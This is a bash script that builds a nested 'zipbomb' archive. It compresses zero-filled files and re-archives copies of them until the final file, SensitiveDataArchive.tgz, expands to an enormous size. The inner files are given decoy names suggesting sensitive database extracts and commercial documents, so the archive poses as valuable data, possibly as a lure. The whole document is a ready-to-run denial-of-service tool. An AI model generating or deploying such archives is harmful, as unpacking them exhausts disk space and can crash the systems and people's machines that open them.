#!/bin/bash

echo "#######################"
echo "# Creating a zipbomb. #"
echo "#######################"
echo ""
echo "Creating base file."
dd if=/dev/zero of=database_extract bs=1M count=3096 2>/dev/null
gzip database_extract
tar -cf archive.tar database_extract.gz && rm database_extract.gz
echo "Adding initial loop"
COUNTS=$(( $RANDOM % 200 + 100))
echo "Creating $COUNTS files."
for b in $(seq 1 "$COUNTS")
do
    dd if=/dev/zero of=sensitive_data_$b.docx bs=1M count=$(( $RANDOM % 8 + 2)) 2>/dev/null
    gzip -2 sensitive_data_$b.docx
    tar -rf archive.tar sensitive_data_$b.docx.gz
    rm sensitive_data_$b.docx*
done
echo "Files created and added to archive.tar"
gzip archive.tar
echo "Gzip'd archive"
echo "Entering second loop"
for a in {1..11}
do
    cp archive.tar.gz archive_$a.tar.gz
done
rm archive.tar.gz
echo "Creating tar archive"
tar -czf ImportantData.tgz archive_*
echo "Removing old copies, first cycle."
rm archive_*
echo "Secondary cycle"
for a in {1..20}
do
    cp ImportantData.tgz Commercially_ImportantData_Section_$a.tgz
done
rm ImportantData.tgz
echo "Creating final archive"
tar -czf SensitiveDataArchive.tgz Commercially_ImportantData* && rm Commercially_ImportantData*
echo ""
echo "#######################"
echo "#       COMPLETED     #"
echo "#######################"
